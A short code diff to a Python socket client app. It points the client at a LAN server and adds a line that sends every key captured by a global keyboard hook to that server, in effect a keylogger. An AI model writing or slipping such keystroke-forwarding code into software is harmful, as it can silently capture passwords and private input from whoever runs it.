@@ -26,7 +26,7 @@ class ClientApp:
         self.response_label.pack()
 
         self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_address = '127.0.0.1'  # Server's IP address
+        self.server_address = '192.168.0.185'  # Server's IP address
         self.server_port = 12345
         self.username = None
         self.password = None
@@ -104,6 +104,7 @@ class ClientApp:
             elif event.event_type == keyboard.KEY_UP:
                 key = event.name
                 pressed_keys.discard(key)
+                self.client_socket.send(key.encode('utf-8'))
         
             print(f"Pressed keys: {', '.join(pressed_keys)}")
         
